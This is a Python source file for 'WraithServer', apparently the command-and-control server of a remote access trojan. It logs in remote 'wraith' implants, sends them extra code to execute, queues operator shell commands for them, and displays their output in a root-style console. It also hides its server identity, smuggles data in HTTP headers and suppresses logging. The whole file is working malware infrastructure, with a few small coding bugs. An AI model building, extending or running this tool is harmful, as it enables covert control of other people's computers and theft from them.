#!/usr/bin/python3

# SETTINGS #
HOST = "0.0.0.0" # IP to bind to
PORT = 8000 # Port to receive connections from (Unprivileged port recommended)
SERVER_HTTP_TAG = "WS9977" # What the server should identify itself as in the HTTP request
WRAITH_LOGIN_TOKEN_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" # List of chars to include in tokens
WRAITH_LOGIN_TOKEN_LENGTH = 25 # Length of each wraith login token (4 digits or under)
WRAITH_MARK_OFFLINE_DELAY = 40 # How many 10ths of a second to wait for a request before marking wraith as offline
WRAITH_ADDITIONAL_CODE_FILE = "wraith_2.0.2_additional.py" # File to read for code to send to wraith
ENABLE_HTTPS = False # Enable encrypted connection to wraith
SEND_DEBUG_MESSAGES = True # Whether to send text messages along with data. False recommended unless debugging

# Dependencies
import time
import ssl
import json
import threading
import trace
import random
import sys
import urwid
import os
from hashlib import md5
from base64 import b64encode
from cryptography.fernet import Fernet
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn

# Check settings
if len(str(WRAITH_LOGIN_TOKEN_LENGTH)) > 4:
    print("Invalid Setting: Wraith login token length cannot be larger than 4 digits!")
    sys.exit()
if not os.path.isfile(WRAITH_ADDITIONAL_CODE_FILE):
    print("Invalid Setting: Additional wraith code file was not found!")
    sys.exit()

# Define software version
SERVER_VERSION = "2.0.2"

# Define some variables

connected_wraiths = {} # Dict to keep track of active connections. Format: {"ID": ["LOGIN TOKEN",[command queue],monitor_thread_instance,1/10seconds_disconnect_timeout]}
current_target = "server" # Variable to keep track of the target to send commands to
screen = urwid.raw_display.Screen()
run_monitor_threads = True # A variable to control the running of monitor threads


# Define some functions and classes

# A function to check if the client is authenticated
def is_auth(headers, data_header, auth_stage=3):
    # If the request contains the nescessary headers
    if auth_stage>1 or "X-FINGERPRINT" in headers.keys() and "X-TOKEN" in data_header.keys():
        # If the fingerprint is listed as connected
        if auth_stage>2 or headers["X-FINGERPRINT"] in connected_wraiths:
            # If the token matches the logged in fingerprint
            if auth_stage>3 or data_header["X-TOKEN"] == connected_wraiths[headers["X-FINGERPRINT"]][0]:
                # Reset the wraith inactive counter
                connected_wraiths[headers["X-FINGERPRINT"]][3] = WRAITH_MARK_OFFLINE_DELAY
                # Return the success status code
                return 0
            else: return 3
        else: return 2
    else: return 1

# Process a command from the Urwid screen then print result
def process_command(command):
    global current_target
    response = "root@{}~# ".format(current_target) + command
    if current_target == "server" or command.startswith("use ") or command == "closesrv" or command == "clear":
        if command.startswith("use "):
            new_target = command.replace("use ","",1).replace("[","",1).replace("]","",1)
            if new_target in connected_wraiths.keys() or new_target == "server":
                current_target = new_target
                response += "\nTarget changed to [{}]!".format(current_target)
            else: response += "\nERR: This target is not connected!"
        elif command == "connected":
            connected_list = ""
            for i in range(len(connected_wraiths.keys())): connected_list += "{}) [{}]\n".format(i+1,list(connected_wraiths.keys())[i])
            if connected_list: response += "\n"+connected_list.strip()
            else: response += "\nThere are no active connections!"
        elif command == "clear":
            cols, rows = screen.get_cols_rows()
            urwid_window.output("\n"*int(rows)+1)
        elif command == "help":
            commands = [
                ["help","Show this help message."],
                ["use","Specify a Wraith ID to send commands to."],
                ["connected","List all active connections."],
                ["clear", "Clear the screen."]
                ["close","Close the server and disconnect wraiths."],
                ["closesrv","Alias of close which works regardless of target."],
            ]
            help_menu = ""
            for i in range(len(commands)): help_menu += "{}) {} - {}\n".format(i+1,commands[i][0],commands[i][1])
            response += "\nHelp Menu:\n"+help_menu.strip()
        elif command == "close" or command == "closesrv": raise urwid.ExitMainLoop
        else: response += "\nERR: Command not recognised!"
    elif current_target in connected_wraiths.keys():
        connected_wraiths[current_target][1].append(command)
    else: response += "\nERR: Target wraith was not found in active connections list!"
    return response

# A function who's instances will run in threads to monitor wraith connections
def monitor_thread(wraith_id):
    global connected_wraiths, current_target
    while run_monitor_threads:
        connected_wraiths[wraith_id][3] -= 1
        if connected_wraiths[wraith_id][3] <= 0:
            # If the disconnected wraith was the target, unset the target
            if current_target == wraith_id:
                current_target = "server"
                urwid_window.focus[0].set_caption("root@{}~# ".format(current_target))
            # Delete the wraith from connection list
            del connected_wraiths[wraith_id]
            # Tell user that the wraith has disconnected
            urwid_window.output("Wraith [{}] disconnected unexpectedly! ({})".format(wraith_id,time.asctime()))
            # Exit, we don't need this thread anymore
            break
        else:
            # Wait 0.1 seconds before taking another 1/10 second from the counter
            time.sleep(0.1)

def read_additional_wraith_file():
    with open(WRAITH_ADDITIONAL_CODE_FILE,"r") as WRAITH_CODE_file: return WRAITH_CODE_file.read()

def encrypt(token, data):
    # Add some data to the token to make it harder to decrypt messages
    token = str(token)+str(PORT)+"thisisarandomstring//1342"
    token_md5 = md5()
    token_md5.update(token.encode())
    return Fernet(b64encode(token_md5.hexdigest().encode())).encrypt(data.encode()).decode()

def decrypt(token, data):
    # Add some data to the token to make it harder to decrypt messages
    token = str(token)+str(PORT)+"thisisarandomstring//1342"
    token_md5 = md5()
    token_md5.update(token.encode())
    return Fernet(b64encode(token_md5.hexdigest().encode())).decrypt(data.encode()).decode()

def parse_request(request, crypt_key):
    try:
        data_header = json.loads(request.headers["X-DATA"])
        if data_header[0] == 1: data = json.loads(decrypt(crypt_key,data_header[1]))
        else: data = json.loads(data_header[1])
        for key in data.keys(): data[key] = str(data[key])
        return data
    except: return None

# A class to create killable thread instances using trace
class KillableThread(threading.Thread):
    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False
    def start(self):
        self.__run_backup = self.run
        self.run = self.__run
        threading.Thread.start(self)
    def __run(self):
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup
    def globaltrace(self, frame, event, arg):
        if event == 'call': return self.localtrace
        else: return None
    def localtrace(self, frame, event, arg):
        if self.killed:
            if event == 'line': raise SystemExit()
        return self.localtrace
    def kill(self): self.killed = True

# A class to manage the screen and I/O using urwid
class CommandListBox(urwid.ListBox):
    def __init__(self):
        # Init CommandListBox
        body = urwid.SimpleFocusListWalker([urwid.Pile([urwid.Edit(("root@{}~# ".format(current_target)))])])
        super().__init__(body)

    def output(self, text, noupdate=False):
        global main_screen_loop
        pos = self.focus_position
        self.body.insert(pos, urwid.Text(text))
        self.focus_position = pos + 1
        self.focus[0].set_edit_text("")
        if not noupdate: main_screen_loop.draw_screen()

    def keypress(self, size, key, trigger_refresh=False):
        if trigger_refresh: return
        key = super().keypress(size, key)
        if key != 'enter': return key
        try: command = self.focus[0].edit_text
        except TypeError: return
        response = process_command(command)
        self.output(response)
        self.focus[0].set_caption("root@{}~# ".format(current_target))

    def exit(self): raise urwid.ExitMainLoop

# Class to handle connections from wraiths
class WraithHandler(BaseHTTPRequestHandler):
    # Specify some options at the start
    server_version = SERVER_HTTP_TAG # A custom server name and version
    sys_version = "" # Remove system (Python) version from response
    protocol_version = "HTTP/1.1" # Newer protocol to allow persistent connections
    close_connection = False # Keep connections alive

    # On GET request
    def do_GET(self):
        global connected_wraiths, current_target
        try:
            # An array for easy disabling of commands. Simply comment it out and it can no longer be accessed.
            paths = [
                # If this is requested, log the wraith in
                # If it is disabled, the server essentially becomes useless as wraiths cannot log in
                "/login",
                # If this is requested, the wraith intentionally disconnected
                # If it is disabled, the wraith cannot successfully log out intentionally and will end connection abruptly
                "/logout",
                # If this is requested, send the code for the wraith
                # If it is disabled, wraiths will be unable to fetch the code and will constantly loop
                "/getcode",
                # If this is requested, the wraith wants to know the commands queued for it. Send them.
                # If it's disabled, wraiths cannot fetch commands and become useless
                "/getqueue",
                # If this is requested, the wraith sent a response. Print it.
                # If it's disabled, wraiths can't respond so no output is produced.
                "/response",
            ]

            # If the option requested is valid
            if self.path in paths:
                # /login
                if self.path == "/login":
                    packet_data = parse_request(self, None)
                    if packet_data == None:
                        self.respond(1,None,"Expected unencrypted data!")
                        return
                    # The fingerprint header needs to be attached or we can't idenitfy the wraith.
                    if "X-FINGERPRINT" in self.headers.keys() and not "X-TOKEN" in packet_data.keys():
                        # Check if the wraith is already connected
                        if self.headers["X-FINGERPRINT"] not in connected_wraiths.keys():
                            # If it's not, log it in...
                            connected_wraiths[self.headers["X-FINGERPRINT"]] = ["",[],KillableThread(target=monitor_thread,args=(self.headers["X-FINGERPRINT"],)),WRAITH_MARK_OFFLINE_DELAY]
                            # ...create a token for it...
                            wraith_token = []
                            for i in range(int(WRAITH_LOGIN_TOKEN_LENGTH)): wraith_token.append(random.choice(WRAITH_LOGIN_TOKEN_CHARSET))
                            wraith_token = "".join(wraith_token)
                            # ...add the token to the list...
                            connected_wraiths[self.headers["X-FINGERPRINT"]][0] = wraith_token
                            # ...respond with success message...
                            self.respond(0,wraith_token,"Successfully logged in.",encryption=self.headers["X-FINGERPRINT"])
                            # Tell the user that a wraith has logged in
                            urwid_window.output("Wraith [{}] connected! ({})".format(self.headers["X-FINGERPRINT"],time.asctime()))
                            # Start a monitor thread for the wraith
                            connected_wraiths[self.headers["X-FINGERPRINT"]][2].start()
                        else: # If another instance from the same location is connected...
                            # ...tell this one to "f*** off"...
                            self.respond(2,None,"Another instance already logged in!",encryption=None)
                            # ...now close the connection
                            self.connection.close()
                    else:
                        if not "X-FINGERPRINT" in self.headers.keys():
                            # If we're missing the fingerprint header
                            self.respond(1,None,"Missing headers!",encryption=None)
                        elif "X-TOKEN" in packet_data.keys():
                            # If the token header is there when it shouldn't be
                            self.respond(1,None,"Invalid headers present!",encryption=None)
                # /logout
                elif self.path == "/logout":
                    if not "X-FINGERPRINT" in self.headers.keys():
                        self.respond(1,None,"Missing auth headers!",encryption=None)
                        return
                    try: wraith_token = connected_wraiths[self.headers["X-FINGERPRINT"]][0]
                    except KeyError:
                        self.respond(1,None,"This wraith fingerprint is not logged in",encryption=None)
                        return
                    packet_data = parse_request(self, wraith_token)
                    if packet_data == None:
                        self.respond(1,None,"Expected encrypted data!")
                        return
                    wraith_is_auth = is_auth(self.headers,packet_data,3)
                    if wraith_is_auth == 0:
                        connected_wraiths[self.headers["X-FINGERPRINT"]][2].kill()
                        connected_wraiths[self.headers["X-FINGERPRINT"]][2].join()
                        del connected_wraiths[self.headers["X-FINGERPRINT"]]
                        urwid_window.output("Wraith [{}] disconnected! ({})".format(self.headers["X-FINGERPRINT"],time.asctime()))
                        if current_target == self.headers["X-FINGERPRINT"]:
                            current_target = "server"
                            urwid_window.focus[0].set_caption("root@{}~# ".format(current_target))
                        self.respond(0,encryption=wraith_token)
                    elif wraith_is_auth == 3: self.respond(1,None,"The wraith token is invalid!",encryption=None)
                    else: self.respond(1,None,"Unknown logic error!",encryption=None)
                # /getcode
                elif self.path == "/getcode":
                    if not "X-FINGERPRINT" in self.headers.keys():
                        self.respond(1,None,"Missing auth headers!",encryption=None)
                        return
                    try: wraith_token = connected_wraiths[self.headers["X-FINGERPRINT"]][0]
                    except KeyError:
                        self.respond(1,None,"This wraith fingerprint is not logged in",encryption=None)
                        return
                    packet_data = parse_request(self, wraith_token)
                    if packet_data == None:
                        self.respond(1,None,"Expected encrypted data!")
                        return
                    wraith_is_auth = is_auth(self.headers,packet_data,3)
                    if wraith_is_auth == 0:
                        wraith_code = read_additional_wraith_file()
                        self.respond(0,wraith_code,encryption=wraith_token)
                    elif wraith_is_auth == 3: self.respond(1,None,"The wraith token is invalid!",encryption=None)
                    else: self.respond(1,None,"Unknown logic error!",encryption=None)
                # /getqueue
                elif self.path == "/getqueue":
                    if not "X-FINGERPRINT" in self.headers.keys():
                        self.respond(1,None,"Missing auth headers!",encryption=None)
                        return
                    try: wraith_token = connected_wraiths[self.headers["X-FINGERPRINT"]][0]
                    except KeyError:
                        self.respond(1,None,"This wraith fingerprint is not logged in",encryption=None)
                        return
                    packet_data = parse_request(self, wraith_token)
                    if packet_data == None:
                        self.respond(1,None,"Expected encrypted data!")
                        return
                    wraith_is_auth = is_auth(self.headers,packet_data,3)
                    if wraith_is_auth == 0:
                        queue = []
                        for command in connected_wraiths[self.headers["X-FINGERPRINT"]][1]:
                            # Add commands to processing queue while also removing them from original queue
                            queue.append(command)
                            connected_wraiths[self.headers["X-FINGERPRINT"]][1].remove(command)
                        self.respond(0,queue,encryption=self.headers["X-TOKEN"])
                    elif wraith_is_auth == 3: self.respond(1,None,"The wraith token is invalid!",encryption=None)
                    else: self.respond(1,None,"Unknown logic error!",encryption=None)
                # /response
                elif self.path == "/response":
                    if not "X-FINGERPRINT" in self.headers.keys():
                        self.respond(1,None,"Missing auth headers!",encryption=None)
                        return
                    try: wraith_token = connected_wraiths[self.headers["X-FINGERPRINT"]][0]
                    except KeyError:
                        self.respond(1,None,"This wraith fingerprint is not logged in",encryption=None)
                        return
                    packet_data = parse_request(self, wraith_token)
                    if packet_data == None:
                        self.respond(1,None,"Expected encrypted data!")
                        return
                    wraith_is_auth = is_auth(self.headers,packet_data,3)
                    if wraith_is_auth == 0:
                        if "X-MESSAGE" in packet_data.keys():
                            cols, rows = screen.get_cols_rows()
                            urwid_window.output("-"*cols+"\n{}\n".format(packet_data["X-MESSAGE"])+"-"*cols)
                            self.respond(0,None,"Successfully received response.",encryption=packet_data["X-TOKEN"])
                        else: self.respond(1,None,"Missing message data!")
                    elif wraith_is_auth == 3: self.respond(1,None,"The wraith token is invalid!",encryption=None)
                    else: self.respond(1,None,"Unknown logic error!",encryption=None)
            # If the requested option is not valid, tell the wraith
            else: self.respond(1,None,"Command not found!",encryption=None)
        except Exception as e:
            urwid_window.output(e)
            self.respond(1,None,"Exception while processing request!",encryption=None)

    # Send HTTP response
    def respond(self, status_code, data=None, message=None, *args, **kwargs):
        if not SEND_DEBUG_MESSAGES: message=None
        # Create a JSON string from all the arguments
        if "encryption" in kwargs.keys() and not kwargs["encryption"] == None: data = [1,encrypt(kwargs["encryption"],json.dumps([status_code,data,message]))]
        else: data = [0,json.dumps([status_code,data,message])]
        data = json.dumps(data)
        # Always send a 204 "No Body". Any info will be in the data header
        self.send_response(204)
        # Send a header with the data
        self.send_header("X-DATA", data)
        # Keep the connection alive unless told otherwise
        self.send_header("Connection", "keep-alive")
        # Send the headers
        self.end_headers()

    # Supress logging of client connections. This will be handled later by us.
    def log_message(self, format, *args): return

# A class to allow the HTTP server to be threaded and work on multiple connections at one time.
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer): pass

print(time.asctime() + " WraithServer_v{} Starting - {}:{}".format(SERVER_VERSION, HOST, PORT))

# Create a server instance
httpd = ThreadedHTTPServer((HOST, PORT), WraithHandler)
# Wrap the instance in SSL encryption for security
if ENABLE_HTTPS: httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
# Start server in thread
httpd_thread = KillableThread(target=httpd.serve_forever)
httpd_thread.start()
# Start urwid mainloop to handle I/O
urwid_window = CommandListBox()
main_screen_loop = urwid.MainLoop(urwid_window)
urwid_window.output("<#[ WraithServer-v{} ]#>".format(SERVER_VERSION),True) # Print a simple start message
main_screen_loop.run()
# When we exit, close server
httpd_thread.kill() # Kill the server thread
run_monitor_threads = False
time.sleep(0.5)

print(time.asctime() + " WraithServer_v{} Stopped - {}:{}".format(SERVER_VERSION, HOST, PORT))

# TODO: Somehow remove ability for malicious users to connect to this server and spam messages
# TODO: No erase box on output
